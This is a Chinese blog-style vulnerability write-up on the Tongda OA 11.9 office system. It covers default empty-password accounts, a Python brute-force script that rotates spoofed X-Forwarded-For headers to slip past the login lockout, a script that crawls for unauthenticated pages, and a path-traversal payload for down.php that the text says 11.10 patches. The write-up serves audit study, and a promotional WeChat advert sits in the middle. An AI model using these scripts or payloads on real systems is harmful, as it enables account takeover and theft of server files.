通达oa 作为攻防演练中出场率较高的一套 OA 系统，决定先从历史漏洞开始挖掘分析，对通达oa 有一个初步的了解。

通达oa 11.9 的[下载地址](https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe)，默认安装地址是
`D:\MYOA`，联网状态下会自动更新到通达 oa 11.10

安装成功后，登录界面如下 默认账号为 admin 对应密码为空。

![image-20220818161509-bte0ncs.png](https://image.3001.net/images/20220901/1662021615_63106fefbcca1cb4271a4.png!small)

登录后我们看到其中还有一些默认账号 lijia wangyun wangde 均可利用空密码登录成功

![image-20220818162036-yl0tcuk.png](https://image.3001.net/images/20220901/1662021617_63106ff1da1717a686204.png!small)

## 爆破密码

正常输入账号名密码时，输入三次错误就会禁止10分钟

![image-20220818162752-7reiym9.png](https://image.3001.net/images/20220901/1662021618_63106ff2f296b679c8995.png!small)

![image-20220818162909-338cxe5.png](https://image.3001.net/images/20220901/1662021620_63106ff46ab307f7675fe.png!small)

我们可以通过代码方面追究其原因

`webroot/inc/td_core.php`

![image-20220819153548-lr4wihc.png](https://image.3001.net/images/20220901/1662021621_63106ff5a605c8c9233eb.png!small)

$USER_IP 的值可以来自于 X-Forwarded-For

写个 python 脚本用于爆破用户名密码

![image-20220819170418-k5owkxu.png](https://image.3001.net/images/20220901/1662021622_63106ff6ab672a912d644.png!small)

    
    
    import requests  
    import sys  
    import re  
    ​  
    def read_passwd(passwordfile):  
      with open(file = passwordfile, mode='r') as f:  
          passwd = f.read().splitlines()  
          return passwd   
    ​  
    def Intruder_password(url,username,passwd_list):  
      success_str ="正在进入OA系统，请稍候..."  
      a=b=c=d=0  
      url = url +"/logincheck.php"  
      for passwd in passwd_list:  
          payload = "UNAME={}&PASSWORD={}&encode_type=1".format(username,passwd)  
          headers = { "X-Forwarded-For": "{}.{}.{}.{}".format(a,b,c,d),"Content-Type": "application/x-www-form-urlencoded"}  
          response = requests.request("POST", url, data=payload, headers=headers)  
          if(re.search(success_str, response.text)):  
              print("正确的账号名:{}密码:{}".format(username,passwd))  
          else:  
              print("错误密码:{}".format(passwd))  
          d=d+1  
          if(d == 255):  
              c = c +1  
              d = 0  
          if(c == 255):  
              b = b +1  
              c = 0  
          if(b == 255):  
              a = a +1  
              b =0  
    ​  
    ​  
    def main():  
      if len(sys.argv) < 4:  
          print("Usage: Intruder_password.py  targeturl username passwdfile\n"  
                "Example: python Intruder_password.py http://10.0.18.1:80 admin passwd.txt")  
          exit()  
      url = sys.argv[1]  
      username = sys.argv[2]  
      passwd_list = read_passwd(sys.argv[3])  
      Intruder_password(url,username,passwd_list)  
    ​  
    if __name__ == '__main__':  
      main()

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 未授权敏感信息泄露

一般我们想要寻找一些高危的漏洞，就是需要寻找一些未授权漏洞，就是在未登录状态下也可以执行授权后的相关功能，编写了一个简单的脚本，先判断哪一些网页是可以在未授权的情况下进行访问到，然后再做进一步的分析

    
    
    import os  
    import sys  
    import requests  
    ​  
    def file_path(url,filefolder):  
      for root, dirs, files in os.walk(filefolder):  
          for f in files:  
              paths = os.path.join(root,f)  
              paths = paths.replace(filefolder,url)  
              paths = paths.replace("\\","/")  
              #print(paths)   
              if(f.endswith(".php")):  
                  response = requests.get(paths)  
                  # print(str(response.status_code)+" "+str(len(response.text))+"  "+paths)  
                  print("code:"+ str(response.status_code) +" len:"+ str(len(response.text))+" url: "+ paths )  
    ​  
    ​  
    def main():  
      if len(sys.argv) < 3:  
          print("Usage: file_path.py targeturl filefolder\n"  
                "Example: python file_path.py http://10.0.18.1:80 \"C:\\Users\\admin\\Desktop\\MYOA\\webroot\"")  
          exit()  
      url = sys.argv[1]  
      filefolder = sys.argv[2]  
      file_path(url,filefolder)  
    ​  
    ​  
    if __name__ == '__main__':  
      main()

<http://10.0.18.1/inc/reg.php>泄露版本信息

![image-20220826165743-hpc7tf9.png](https://image.3001.net/images/20220901/1662021623_63106ff77c057e1a2b99f.png!small)

还有很多可以未授权显示的页面，不一一展示了

## 未授权文件下载

通过不断测试，也找到了一个比较有价值的漏洞，就是未授权文件下载

构造链接
`<http://10.0.18.1/inc/package/down.php?id=/../../../../../../../../../a>`

![image-20220826165859-9e64yjr.png](https://image.3001.net/images/20220901/1662021625_63106ff9119a9fd2ea902.png!small)

就可以下载到根目录下的 a.zip 文件

![image-20220826165943-71b3940.png](https://image.3001.net/images/20220901/1662021625_63106ff9c6d60b9b9adef.png!small)

我们从代码层面分析一下漏洞的成因

`webroot/inc/package/down.php`

![image-20220826170025-d695sog.png](https://image.3001.net/images/20220901/1662021627_63106ffb0d07197def704.png!small)

我们看到通过 GET 方法获取到 id 值，拼接到 `$FILE_PATH`中，并没有做任何过滤，传到函数 `td_download`中

`webroot/inc/utility_file.php`

![image-20220826171624-ya8a86s.png](https://image.3001.net/images/20220901/1662021628_63106ffc138041b10fab2.png!small)

如此便实现了任意文件下载，这是在版本 11.09 中 存在的漏洞，在自动更新到 11.10 后 漏洞便被修复了，我们查看一下代码

`webroot/inc/package/down.php`我们看到对传入的参数进行了过滤，无法再跨越目录的进行下载

![image-20220826172055-l8h9lod.png](https://image.3001.net/images/20220901/1662021629_63106ffd0c684cfd30e6d.png!small)

 ****

 **靶场实验练习推荐：**

 **[代码审计利器-RIPS实践（合天网安实验室）](https://www.hetianlab.com/expc.do?ec=ECIDb9ac-4540-46b4-b676-22df36b5935b)**

